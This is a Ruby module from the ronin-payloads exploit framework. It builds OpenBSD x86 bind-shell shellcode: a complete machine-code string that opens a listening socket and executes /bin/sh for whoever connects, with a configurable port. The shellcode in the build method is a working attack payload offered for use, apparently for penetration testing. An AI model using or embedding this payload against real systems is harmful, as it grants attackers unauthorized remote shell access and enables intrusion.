# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2024 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require_relative '../../../../shellcode/bind_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module OpenBSD
        module X86
          #
          # OpenBSD x86 shellcode that binds a shell to a port.
          #
          class BindShell < BindShellPayload

            register 'shellcode/openbsd/x86/bind_shell'

            arch :x86
            os :openbsd

            author 'noir'

            summary 'OpenBSD x86 bind shell shellcode'
            description <<~DESC
              OpenBSD x86 shellcode that binds a shell to a port.
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-164.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x31\xc9\x51\x41\x51\x41\x51\x51\x31\xc0\xb0\x61\xcd\x80\x89\x07" \
                         "\x31\xc9\x88\x4f\x04\xc6\x47\x05\x02\x89\x4f\x08\x66\xc7\x47\x06" \
                         "#{packed_port}\x6a\x10\x8d\x47\x04\x50\x8b\x07\x50\x50\x31\xc0\xb0\x68" \
                         "\xcd\x80\x6a\x01\x8b\x07\x50\x50\x31\xc0\xb0\x6a\xcd\x80\x31\xc9" \
                         "\x51\x51\x8b\x07\x50\x50\x31\xc0\xb0\x1e\xcd\x80\x89\x07\x31\xc9" \
                         "\x51\x8b\x07\x50\x50\x31\xc0\xb0\x5a\xcd\x80\x41\x83\xf9\x03\x75" \
                         "\xef\xeb\x23\x5b\x89\x1f\x31\xc9\x88\x4b\x07\x89\x4f\x04\x51\x8d" \
                         "\x07\x50\x8b\x07\x50\x50\x31\xc0\xb0\x3b\xcd\x80\x31\xc9\x51\x51" \
                         "\x31\xc0\xb0\x01\xcd\x80\xe8\xd8\xff\xff\xff\x2f\x62\x69\x6e\x2f" \
                         "\x73\x68\x41\x90"
            end

          end
        end
      end
    end
  end
end
